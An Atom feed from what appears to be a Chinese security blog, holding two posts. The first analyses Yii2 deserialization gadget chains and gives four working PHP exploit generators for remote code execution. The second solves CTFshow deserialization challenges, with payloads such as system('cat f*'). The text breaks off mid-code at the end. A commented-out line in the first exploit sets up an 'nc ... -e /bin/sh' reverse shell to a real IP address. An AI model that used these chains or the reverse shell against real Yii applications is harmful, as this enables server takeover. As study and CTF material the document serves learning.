<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>be a J0K1R</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-01-15T08:02:08.662Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Peguin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Yii框架反序列化漏洞</title>
    <link href="http://yoursite.com/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-01-15T01:29:57.000Z</published>
    <updated>2021-01-15T08:02:08.662Z</updated>
    
    <content type="html"><![CDATA[<p>做show平台序列化题时发现后面几个php流行框架都没审过序列化链子，花半天时间来审一下<a id="more"></a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win10</span><br><span class="line">yii2版本：2.0.37和2.0.38</span><br><span class="line">php:7.3</span><br></pre></td></tr></table></figure><h2 id="pop链分析"><a href="#pop链分析" class="headerlink" title="pop链分析"></a>pop链分析</h2><h3 id="pop链1"><a href="#pop链1" class="headerlink" title="pop链1"></a>pop链1</h3><p><code>__destruct()</code>起手，入口在<code>vendor\yiisoft\yii2\db\BatchQueryResult.php</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png" class=""><p>跟进<code>reset()</code>方法</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png" class=""><p><code>$this-&gt;_dataReader</code>可控，只要值不为<code>null</code>就会调用<code>close()</code>方法，到这里可以找跳板了，找一个类不存在<code>close()</code>方法的，但是有<code>__call()</code>魔术方法的全局搜索，这里找到的是<code>vendor\fzaninotto\faker\src\Faker\Generator.php</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/3.png" class=""><p>跟进<code>format()</code>方法</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/4.png" class=""><p>这里调用了<code>call_user_func_array</code>方法，跟进<code>getFormatter()</code>方法</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/5.png" class=""><p><code>getFormatter()</code>方法中，<code>$this-&gt;formatters</code>可控，也就是<code>getFormatter()</code>方法返回值可控，此时传入的<code>$formatter</code>为<code>close</code>;在看<code>format()</code>方法中，<code>call_user_func_array</code>第一个参数可控，第二个参数<code>$argument</code>参数为空，也就是要找到一个无参的调用方法并且包含<code>call_user_func</code></p><p>构造正则表达式</p><p><code>function \w+\(\) ?\n?\{(.*\n)+call_user_func</code></p><p><code>vendor\yiisoft\yii2\rest\CreateAction.php</code>中的<code>run()</code>方法</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/6.png" class=""><p><code>$this-&gt;checkAccess</code>和<code>$this-&gt;id</code>都可控，可以rce</p><p>到这里链子也就出来了</p><p><code>yii\db\BatchQueryResult::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//            $this-&gt;checkAccess = 'shell_exec';</span></span><br><span class="line"><span class="comment">//            $this-&gt;id = 'nc 47.98.48.218 7777 -e /bin/sh';</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">'phpinfo'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">'close'</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">'run'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> Generator;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试还需要自己配置一个反序列化的入口文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Yii</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AxinController</span> <span class="keyword">extends</span> \<span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionDeser</span><span class="params">($data)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> unserialize(base64_decode($data));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>打一下poc</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/7.png" class=""><h3 id="pop链2"><a href="#pop链2" class="headerlink" title="pop链2"></a>pop链2</h3><p>yii2.0.37中<code>BatchQueryResult</code>类被修复了，需要另外找起点</p><p>还是<code>__destruct()</code>起手，全局搜索很容易找到<code>$this-&gt;stopPrecess()</code>方法，<code>vendor\codeception\codeception\ext\RunProcess.php</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/8.png" class=""><p>跟进<code>stopProcess()</code>方法</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/9.png" class=""><p>这里调用了<code>isRunning()</code>，上面的pop链后半条<code>__call()</code>为跳板的可以接上</p><p>pop链</p><p><code>Codeception\Extension\RunProcess::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">'phpinfo'</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">'isRunning'</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">'run'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $processes;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> Generator()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    // 生成<span class="title">poc</span></span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="pop链3"><a href="#pop链3" class="headerlink" title="pop链3"></a>pop链3</h3><p>入口点在<code>vendor\swiftmaller\swiftmaller\lib\classes\Swift\KeyCache\DiskKeyCode.php</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/10.png" class=""><p>跟进<code>clearAll()</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/11.png" class=""><p><code>$this-&gt;keys</code>可控，也就是说<code>$nsKey</code>和<code>$itemKey</code>可控，跟进<code>clearKey()</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/12.png" class=""><p><code>unlink()</code>对路径进行了字符串的拼接，到这里可以想到利用<code>__toString()</code>魔术方法为跳板，但是整个项目中<code>__toString()</code>有200多个，这里跟着公开的poc直接定位到<code>\vendor\phpdocumentor\reflection-docblock\src\DocBlock\Tags\See.php</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/13.png" class=""><p>这里的<code>$this-&gt;descrption</code>是可控的，就可以调用<code>$this-&gt;descrption-&gt;render()</code>方法，就可以调用<code>__call</code>魔术方法了</p><p>pop链</p><p><code>Swift_KeyCache_DiskKeyCache -&gt; phpDocumentor\Reflection\DocBlock\Tags\See::__toString()-&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">'phpinfo'</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">'render'</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">'run'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $keys = [];</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="comment">//二维数组，具体可看clearAll方法</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">"axin"</span>=&gt;<span class="keyword">array</span>(<span class="string">"is"</span>=&gt;<span class="string">"handsome"</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>poc打过去</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/14.png" class=""><h3 id="pop链4"><a href="#pop链4" class="headerlink" title="pop链4"></a>pop链4</h3><p>找到一个类中存在close()方法并且这个方法存在危险函数或是又可以延展调用链的就可以了，具体过程不在赘述</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = $func;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = $param;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\IndexAction($func, $param), <span class="string">"run"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">base</span>\<span class="title">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\DbSession($func, $param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $exp = new \yii\db\BatchQueryResult('system', 'whoami');</span><br><span class="line">    <span class="keyword">echo</span>(base64_encode(serialize($exp)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做show平台序列化题时发现后面几个php流行框架都没审过序列化链子，花半天时间来审一下
    
    </summary>
    
    
    
      <category term="yii" scheme="http://yoursite.com/tags/yii/"/>
    
  </entry>
  
  <entry>
    <title>show序列化</title>
    <link href="http://yoursite.com/2021/01/13/show%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://yoursite.com/2021/01/13/show%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-01-13T09:38:29.000Z</published>
    <updated>2021-01-15T07:52:39.577Z</updated>
    
    <content type="html"><![CDATA[<p>序列化部分练手，避免手生<a id="more"></a></p><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><p>直接传参即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</span><br></pre></td></tr></table></figure><p>没get到点，不知道考察啥</p><h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET:username=xxxxxx&amp;password=xxxxxx</span><br><span class="line">cookie:user=O:<span class="number">11</span>:<span class="string">"ctfShowUser"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"isVip"</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line"><span class="comment">//注意分号要进行编码</span></span><br></pre></td></tr></table></figure><h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p>比上一题多了个条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"your flag is "</span>.$flag;</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure><p>做一下修改即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">public</span> $isVip=<span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a  = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">$a-&gt;isVip=<span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="comment">//O%3A11%3A%22ctfShowUser%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><p>两个类中都有<code>getInfo()</code>方法，能利用的是<code>blackDoor</code>类中的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">exp</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $class;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code = <span class="string">'system("cat f*");'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a  = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 